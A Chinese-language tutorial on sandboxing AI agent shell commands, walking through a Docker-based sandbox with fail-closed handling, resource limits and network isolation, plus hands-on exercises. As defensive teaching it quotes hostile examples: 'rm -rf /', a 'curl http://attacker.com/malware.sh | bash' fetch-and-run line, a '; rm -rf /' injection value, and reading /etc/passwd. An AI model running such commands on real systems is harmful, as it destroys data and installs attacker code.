# 沙箱（Sandbox）深度理解指南

这是一份**只讲沙箱**的学习指南。假设你已经理解 Agent 的基本概念（模型、工具调用、消息循环），现在要搞清楚"沙箱到底是什么、为什么需要、怎么实现的"。

---

## 第一部分：沙箱是什么（10 分钟）

### 现实世界的类比

想象你要测试一个不信任的炸弹：

- ❌ **不安全的做法**：直接在你家客厅引爆 → 房子炸了
- ✅ **安全的做法**：在沙漠的防爆箱里引爆 → 炸了也只是箱子坏了

**沙箱就是软件世界的"防爆箱"**。

### 软件中的沙箱

当 Agent（AI 助手）要执行一段代码或命令时：

- ❌ **不用沙箱**：直接在你的电脑上运行 → 可能删除文件、泄露密钥、破坏系统
- ✅ **用沙箱**：在一个隔离的环境里运行 → 最多破坏沙箱本身，你的电脑安全

### 核心目标

**限制破坏范围**：即使代码是恶意的，也只能在沙箱内捣乱，不能影响外面的世界。

---

## 第二部分：为什么 Agent 需要沙箱（15 分钟）

### 问题场景

假设你让 AI 帮你写代码：

```
你: "帮我清理一下临时文件"
AI: 好的，我执行 `rm -rf /tmp/*`
```

看起来合理，但如果 AI 误判了：

```
AI: 我执行 `rm -rf /`  # 删除整个系统！
```

或者更隐蔽的：

```
AI: 我执行 `curl http://attacker.com/malware.sh | bash`
```

### 为什么 AI 不可靠？

1. **模型不是 100% 准确**：可能理解错误、生成错误命令
2. **Prompt 注入攻击**：用户可能故意诱导 AI 做坏事
3. **训练数据污染**：模型可能学到了恶意模式

### 沙箱的作用

即使 AI 生成了危险命令，沙箱也能限制损害：

- 命令只能在沙箱内运行
- 沙箱内只有必要的文件（你的项目代码），没有系统文件
- 沙箱内不能访问网络（除非你明确允许）
- 沙箱内不能读取你的密钥、浏览器 cookie 等敏感信息

---

## 第三部分：沙箱的核心概念（20 分钟）

### 概念 1：隔离（Isolation）

**隔离什么？**

| 资源 | 不隔离的后果 | 隔离后的效果 |
|------|------------|------------|
| **文件系统** | 可以读取 `/etc/passwd`、你的私钥 | 只能看到挂载的项目目录 |
| **进程** | 可以看到并杀死其他进程 | 只能看到沙箱内的进程 |
| **网络** | 可以发送数据到外部服务器 | 网络请求被阻止 |
| **用户权限** | 可能以 root 身份运行 | 强制以非特权用户运行 |
| **资源** | 可以吃满所有 CPU/内存 | 限制最多用 1 核 CPU、512MB 内存 |

### 概念 2：最小权限原则（Least Privilege）

**默认什么都不给，按需开放**

例如：
- 默认：不能访问网络
- 需要安装依赖（`pip install`）时：临时开启网络
- 执行完就关闭

### 概念 3：Fail-Closed（失败时保持关闭）

**如果沙箱启动失败，应该怎么办？**

❌ **错误做法（Fail-Open）**：
```python
try:
    result = run_in_sandbox(command)
except SandboxError:
    # 沙箱坏了，算了，直接在宿主机运行吧
    result = run_on_host(command)  # 危险！
```

✅ **正确做法（Fail-Closed）**：
```python
try:
    result = run_in_sandbox(command)
except SandboxError:
    # 沙箱坏了，拒绝执行！
    raise SecurityError("沙箱不可用，拒绝执行不可信命令")
```

**为什么？**
- 如果悄悄退化到宿主执行，用户以为命令在沙箱里，实际上没有任何保护
- 这叫"虚假安全感"，比没有安全措施更危险

---

## 第四部分：本项目的沙箱实现（30 分钟）

### 技术选型：Docker

本项目选择 **Docker 容器** 作为沙箱。

**什么是 Docker？**
- 轻量级的虚拟化技术
- 可以创建一个"迷你 Linux 系统"，与宿主机隔离
- 启动快（秒级），资源占用少

**为什么不选虚拟机（VM）？**
- VM 太重：启动慢（分钟级），占用资源多
- Docker 够用：对于运行简单命令来说，隔离强度足够

### 沙箱的接口设计

打开 `python-pi-agent/src/pi_agent_py/ports.py`，找到：

```python
class ProcessSandbox(Protocol):
    """Runs exact argv behind an enforceable process/workspace boundary."""
    async def run(
        self,
        request: SandboxProcessRequest,
    ) -> SandboxProcessResult:
        ...
```

**这是一个接口（Protocol）**，意思是：
- 任何沙箱实现都要有 `run` 方法
- 输入：`SandboxProcessRequest`（要执行什么命令）
- 输出：`SandboxProcessResult`（命令执行的结果）

**为什么要定义接口？**
- 核心代码不关心沙箱怎么实现的（Docker、虚拟机、还是云服务器）
- 可以轻松替换实现：开发时用简单的，生产时用安全的

### 请求和结果的结构

**SandboxProcessRequest（我要执行什么）**：

```python
@dataclass
class SandboxProcessRequest:
    argv: tuple[str, ...]        # 命令参数，如 ("ls", "-la")
    workdir: str                  # 工作目录，如 "/workspace"
    mode: Literal["read-only", "workspace-write"]  # 是否允许写文件
    timeout_seconds: float | None  # 超时时间
```

**关键字段解释**：

1. **`argv`**：精确的命令参数
   - 为什么是 tuple 不是字符串？
   - 避免 Shell 注入攻击！
   ```python
   # 不安全：拼接字符串
   command = f"ls {user_input}"  # 如果 user_input="; rm -rf /"，就炸了
   
   # 安全：用列表
   argv = ("ls", user_input)  # user_input 会被当作普通参数，不会被解释为命令
   ```

2. **`mode`**：读写权限
   - `read-only`：只能读文件，不能改
   - `workspace-write`：可以在项目目录里写文件

3. **`timeout_seconds`**：防止命令卡死
   - 例如：`sleep 9999` 会一直运行
   - 设置超时后，到时间就强制终止

**SandboxProcessResult（执行结果）**：

```python
@dataclass
class SandboxProcessResult:
    exit_code: int           # 退出码，0=成功，非0=失败
    stdout: str              # 标准输出（命令打印的内容）
    stderr: str              # 标准错误（错误信息）
    enforcement: Literal["full", "partial", "none"]  # 隔离级别
    stdout_truncated: bool   # 输出是否被截断（太长了）
    stderr_truncated: bool
```

**关键字段：`enforcement`**
- `"full"`：真正的隔离（Docker、VM）
- `"partial"`：部分隔离（可能被绕过）
- `"none"`：没有隔离（直接在宿主机运行）

**为什么需要这个字段？**
- 让调用方知道"这个命令真的被隔离了吗"
- 如果沙箱实现偷偷退化了，调用方可以拒绝接受

---

## 第五部分：Docker 沙箱的具体实现（45 分钟）

打开 `python-pi-agent/src/pi_agent_py/sandbox.py`，这是核心实现。

### 5.1 构造函数：配置沙箱

```python
class DockerProcessSandbox:
    def __init__(
        self,
        workspace_root: str | Path,  # 项目目录
        *,
        image: str,                  # Docker 镜像，如 "python:3.12-slim"
        network_enabled: bool = False,  # 是否允许访问网络
        memory_limit: str = "512m",    # 内存限制
        cpu_limit: float = 1.0,        # CPU 限制
        process_limit: int = 128,      # 最多进程数
        ...
    ):
```

**关键参数解释**：

1. **`workspace_root`**：唯一能访问的目录
   - 例如：`E:\project\self-agent\pi-agent`
   - 沙箱内只能看到这个目录的内容，看不到你电脑的其他文件

2. **`image`**：Docker 镜像
   - 镜像 = 预装了软件的"迷你 Linux 系统"
   - 例如：`python:3.12-slim` 包含 Python 3.12，但没有 Node.js
   - 必须提前拉取：`docker pull python:3.12-slim`

3. **`network_enabled`**：默认禁止联网
   - 为什么？防止数据泄露、下载恶意代码
   - 什么时候开启？需要 `pip install` 或 `curl` 时

4. **资源限制**：防止占用过多资源
   - `memory_limit="512m"`：最多 512MB 内存
   - `cpu_limit=1.0`：最多 1 个 CPU 核心
   - `process_limit=128`：最多 128 个进程

### 5.2 构建 Docker 命令

核心方法：`build_command`

```python
def build_command(self, request: SandboxProcessRequest, *, container_name: str):
    arguments = [
        "docker", "run",
        "--rm",                      # 运行完自动删除容器
        "--name", container_name,    # 容器名称（用于后续清理）
        
        # === 安全参数 ===
        "--cap-drop", "ALL",         # 删除所有 Linux 能力
        "--security-opt", "no-new-privileges",  # 禁止提权
        "--read-only",               # 根文件系统只读
        
        # === 资源限制 ===
        "--pids-limit", "128",       # 最多进程数
        "--memory", "512m",          # 内存限制
        "--cpus", "1.0",             # CPU 限制
        
        # === 文件系统 ===
        "--mount", f"type=bind,source={workspace_root},target=/workspace",
        "--workdir", "/workspace",
        
        # === 网络 ===
        "--network", "none",         # 禁止网络
        
        # === 临时目录 ===
        "--tmpfs", "/tmp:rw,noexec,nosuid,size=64m",  # 可写的临时目录
        
        # === 镜像和命令 ===
        "python:3.12-slim",          # 镜像名
        "ls", "-la",                 # 要执行的命令
    ]
    return tuple(arguments)
```

**每个参数的作用**：

#### 安全参数

1. **`--cap-drop ALL`**：删除 Linux 能力
   - Linux 能力 = 特权操作的权限（如修改网络配置、加载内核模块）
   - 删除后，即使获得 root 权限，也做不了很多事

2. **`--security-opt no-new-privileges`**：禁止提权
   - 防止通过 `sudo`、`setuid` 等方式提升权限

3. **`--read-only`**：根文件系统只读
   - 容器的 `/bin`、`/usr`、`/etc` 等目录都是只读的
   - 不能修改系统文件、安装后门

#### 资源限制

4. **`--memory 512m`**：内存限制
   - 防止恶意代码吃光内存导致系统卡死

5. **`--cpus 1.0`**：CPU 限制
   - 防止占用所有 CPU 核心

6. **`--pids-limit 128`**：进程数限制
   - 防止 fork 炸弹（不断创建进程，耗尽资源）

#### 文件系统

7. **`--mount type=bind,source=...,target=/workspace`**：挂载项目目录
   - `source`：宿主机的项目目录（如 `E:\project\...`）
   - `target`：容器内的路径（固定为 `/workspace`）
   - 容器只能访问这一个目录

8. **`--tmpfs /tmp:rw,noexec,nosuid,size=64m`**：临时目录
   - `rw`：可读写（因为根文件系统是只读的）
   - `noexec`：不能执行里面的文件（防止下载恶意脚本后执行）
   - `nosuid`：不能用 setuid 提权
   - `size=64m`：最多 64MB

#### 网络

9. **`--network none`**：禁止网络
   - 容器内没有网络接口，任何网络请求都会失败
   - 防止数据泄露、下载恶意代码

### 5.3 执行命令

```python
async def run(self, request: SandboxProcessRequest) -> SandboxProcessResult:
    # 1. 构建 Docker 命令
    container_name = f"pi-agent-{uuid4().hex}"
    arguments = self.build_command(request, container_name=container_name)
    
    # 2. 启动 Docker 进程
    try:
        process = await asyncio.create_subprocess_exec(
            *arguments,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
    except (FileNotFoundError, PermissionError, OSError) as error:
        # Docker 不可用 → Fail-Closed
        raise SandboxUnavailableError(
            "Docker could not be started; refusing to run on the host"
        ) from error
    
    # 3. 等待执行完成（带超时）
    try:
        if request.timeout_seconds is not None:
            async with asyncio.timeout(request.timeout_seconds):
                stdout, stderr, ... = await _capture_output(process, ...)
    except TimeoutError:
        # 超时了 → 清理容器
        await self._stop_container(container_name, process)
        raise SandboxTimeoutError("sandboxed command exceeded its timeout")
    
    # 4. 返回结果
    return SandboxProcessResult(
        exit_code=process.returncode,
        stdout=stdout.decode("utf-8"),
        stderr=stderr.decode("utf-8"),
        enforcement="full",  # 明确标记：这是真正的隔离
    )
```

**关键点**：

1. **Fail-Closed**：Docker 启动失败 → 抛出异常，不执行
2. **超时清理**：超时后主动停止容器
3. **Enforcement 透明**：明确返回 `enforcement="full"`

### 5.4 清理容器

```python
async def _stop_container(self, container_name: str, process: _RunningProcess):
    # 1. 强制删除容器
    try:
        cleanup = await asyncio.create_subprocess_exec(
            "docker", "rm", "--force", container_name,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        async with asyncio.timeout(5):
            await cleanup.communicate()
    except (FileNotFoundError, PermissionError, OSError, TimeoutError):
        pass  # 尽力而为，失败了也不影响主流程
    
    # 2. 杀死本地 Docker 客户端进程
    finally:
        if process.returncode is None:
            process.kill()
            await process.wait()
```

**为什么要这样清理？**

- 取消 Python 的 `asyncio.timeout()` 只会杀死本地的 `docker` 客户端进程
- 但容器可能还在后台运行！
- 所以要显式执行 `docker rm --force`

---

## 第六部分：动手实验（30 分钟）

现在运行代码，亲眼看看沙箱的效果。

### 实验 1：查看 Docker 命令

打开 `python-pi-agent/examples/20_docker_workspace_sandbox.py`，添加调试输出：

```python
# 在 main() 函数中，创建 sandbox 后添加：
process_sandbox = DockerProcessSandbox(...)

# 添加这几行：
from pi_agent_py.domain import SandboxProcessRequest
dummy_request = SandboxProcessRequest(
    argv=("echo", "hello"),
    workdir="/workspace",
    mode="read-only",
    timeout_seconds=None,
)
docker_cmd = process_sandbox.build_command(dummy_request, container_name="test")
print("Docker 命令:", " ".join(docker_cmd))
```

运行，看看生成的 Docker 命令是什么样的。

**思考**：
- 能找到 `--cap-drop ALL` 吗？
- 能找到 `--network none` 吗？
- `--mount` 的 source 是什么路径？

### 实验 2：测试隔离性

修改 FakeProvider，让它尝试访问系统文件：

```python
provider = FakeProvider([
    [
        ToolCall(
            "call-1",
            "shell",
            {"command": "cat /etc/passwd"}  # 尝试读取系统密码文件
        ),
        Finish("tool_calls")
    ],
    [TextDelta("读取结果"), Finish()],
])
```

运行，观察输出：
- 能读到内容吗？（能，但是容器的 `/etc/passwd`，不是你电脑的）
- 内容是什么？（容器内的用户列表，很少）

### 实验 3：测试网络隔离

```python
{"command": "curl https://www.baidu.com"}
```

运行，观察输出：
- 应该失败，提示网络不可达

### 实验 4：测试资源限制

```python
{"command": "stress-ng --vm 1 --vm-bytes 1G"}  # 尝试占用 1GB 内存
```

如果容器里没有 `stress-ng`，用这个：

```python
{"command": "python -c 'a = [0] * 10**9'"}  # 尝试分配巨大列表
```

观察：
- 会被内存限制杀死吗？（应该会，因为 `--memory 512m`）

---

## 第七部分：常见问题（20 分钟）

### Q1: 为什么不用 Python 自带的 `subprocess`？

A: `subprocess` 只是启动进程，没有隔离：

```python
# 这会在你的电脑上直接运行！
subprocess.run(["rm", "-rf", "/"], check=True)
```

Docker 提供了隔离：

```python
# 这只会在容器里运行，删不掉你的文件
docker run --rm ubuntu rm -rf /
```

### Q2: 沙箱能防止所有攻击吗？

A: **不能**。沙箱只隔离 Shell 命令，不隔离 Python 代码。

例如，这个 Python 工具不会被隔离：

```python
class BadTool(Tool):
    async def execute(self, arguments, context):
        import os
        os.system("rm -rf /")  # 这段 Python 代码在宿主机运行！
```

**怎么办？**
- 只用可信的 Python 工具
- 或者把整个 Agent 进程也放进容器

### Q3: Docker 必须提前安装吗？

A: 是的。本项目遵循 Fail-Closed 原则：
- Docker 不可用 → 抛出 `SandboxUnavailableError`
- 不会退化到宿主执行

### Q4: Windows 上 Docker 体验不好怎么办？

A: 有几个选择：
1. 用 WSL2 + Docker Desktop（推荐）
2. 实现 `HostProcessSandbox`（用 `subprocess`，标记 `enforcement="none"`）
3. 用远程 Linux 服务器执行

### Q5: 沙箱内可以安装软件吗？

A: 取决于配置：
- 根文件系统是只读的 → 不能用 `apt-get install`
- 但可以在 `/tmp` 里放临时文件
- 建议：提前在 Docker 镜像里装好需要的软件

### Q6: 如何让沙箱支持 GPU？

A: 修改 `build_command`，添加：

```python
arguments.extend(["--gpus", "all"])
```

但需要：
- 宿主机有 NVIDIA GPU
- 安装了 `nvidia-docker2`
- 镜像支持 CUDA

---

## 第八部分：设计权衡（15 分钟）

### 为什么选择 Docker 而不是...

| 方案 | 优点 | 缺点 | 为什么不选 |
|------|------|------|----------|
| **虚拟机** | 隔离强 | 启动慢、资源占用大 | 对简单命令来说太重 |
| **语言沙箱（Deno/WASM）** | 启动快 | 只能隔离特定语言 | 不能运行任意系统命令 |
| **远程执行** | 隔离极强 | 需要网络、延迟高 | 增加基础设施成本 |
| **审批机制** | 实现简单 | 不是真正的沙箱 | 依赖人类判断，不可靠 |

**本项目选择 Docker**：
- 启动快（秒级）
- 隔离强度够用
- 跨平台（Windows/Mac/Linux）
- 生态好（大量预制镜像）

### 当前设计的局限性

**只隔离 Shell，不隔离 Python 工具**

适用场景：
- ✅ 可信的 Python 工具（官方提供）
- ✅ 不可信的用户命令（模型生成的 Shell 命令）

不适用场景：
- ❌ 不可信的 Python 插件（第三方工具）
- ❌ 高风险代码仓库（可能包含恶意脚本）

**解决方案**：
- 高风险场景：把整个 Agent 也放进容器
- 或者用更强的隔离（MicroVM、远程执行）

---

## 第九部分：进阶话题（可选）

### 1. 实现一个简单的 HostProcessSandbox

```python
class HostProcessSandbox:
    """在宿主机运行命令，enforcement='none'"""
    
    async def run(self, request: SandboxProcessRequest) -> SandboxProcessResult:
        process = await asyncio.create_subprocess_exec(
            *request.argv,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=request.workdir,
        )
        stdout, stderr = await process.communicate()
        return SandboxProcessResult(
            exit_code=process.returncode,
            stdout=stdout.decode("utf-8"),
            stderr=stderr.decode("utf-8"),
            enforcement="none",  # 明确标记：没有隔离！
        )
```

### 2. 实现一个 SandboxPolicy

```python
class SandboxPolicy(Protocol):
    """决定什么时候用哪种沙箱"""
    
    def select(
        self,
        tool: ToolDefinition,
        context: ToolExecutionContext,
    ) -> ProcessSandbox:
        ...

class ConservativePolicy:
    """保守策略：优先用 Docker"""
    
    def __init__(self, docker: DockerProcessSandbox, host: HostProcessSandbox):
        self.docker = docker
        self.host = host
    
    def select(self, tool, context):
        # 只读工具可以用宿主机
        if tool.side_effects == "none":
            return self.host
        
        # 写操作必须用 Docker
        return self.docker
```

### 3. 增加沙箱观测

```python
@dataclass
class SandboxExecutionEvent:
    tool_name: str
    command: str
    enforcement: str
    exit_code: int
    duration_ms: float

# 在 DockerProcessSandbox.run 中发射事件
self.event_sink.emit(SandboxExecutionEvent(...))
```

---

## 总结：你现在应该理解的

完成本指南后，你应该能够：

✅ **解释沙箱的作用**
- 限制破坏范围，即使 AI 生成恶意命令也无法破坏系统

✅ **理解隔离的边界**
- 文件系统：只能访问挂载的项目目录
- 网络：默认禁止，防止数据泄露
- 资源：限制 CPU、内存、进程数
- 权限：删除所有 Linux 能力，禁止提权

✅ **理解 Fail-Closed 原则**
- Docker 不可用 → 拒绝执行
- 不会悄悄退化到宿主执行

✅ **理解 Enforcement 透明性**
- 结果明确标记隔离级别（`full` / `partial` / `none`）
- 调用方可以验证是否真的被隔离了

✅ **理解当前设计的局限**
- 只隔离 Shell 命令，不隔离 Python 工具
- 适合可信工具 + 不可信命令的场景

✅ **知道如何扩展**
- 实现 `HostProcessSandbox`（开发用）
- 实现 `SandboxPolicy`（决策层）
- 增加观测事件（审计日志）

---

## 检查清单

不看代码，尝试回答：

- [ ] 沙箱解决了什么问题？
- [ ] 为什么需要隔离文件系统、网络、进程？
- [ ] 什么是 Fail-Closed？为什么重要？
- [ ] `--cap-drop ALL` 删除了什么？
- [ ] `--read-only` 为什么重要？容器还能写文件吗？
- [ ] `--network none` 能防止什么攻击？
- [ ] 沙箱超时后，如何清理容器？
- [ ] 为什么 `argv` 是 tuple 而不是字符串？
- [ ] `enforcement` 字段有什么用？
- [ ] 沙箱能隔离 Python 工具吗？为什么？

如果能回答 80% 以上，说明你已经理解了沙箱设计！

---

还有不理解的地方，随时提问！
